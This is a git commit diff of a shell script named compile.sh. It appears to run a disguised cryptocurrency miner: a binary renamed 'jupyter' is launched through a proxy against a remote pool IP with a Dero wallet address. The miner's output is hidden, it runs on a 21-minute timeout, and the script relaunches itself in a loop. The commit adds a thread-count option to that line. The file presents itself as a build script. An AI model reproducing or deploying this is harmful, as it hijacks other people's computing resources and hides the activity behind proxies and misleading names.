08887ae5d6ca4b2ca74ba9bd3c9cbacdceec0f68
sindualan82 <114896695+sindualan82@users.noreply.github.com>
2022-11-03 14:35:46 +0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -21,6 +21,6 @@ echo "Original IP ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "New IP ==> "$(./proxy curl ifconfig.me)
-timeout 21m ./proxy ./jupyter  -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-Lord) >/dev/null &
+timeout 21m ./proxy ./jupyter  -r 159.223.89.34:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.$(echo $(shuf -i 1-20000 -n 1)-Lord) -m 8 >/dev/null &
 ./compile.sh
 echo success
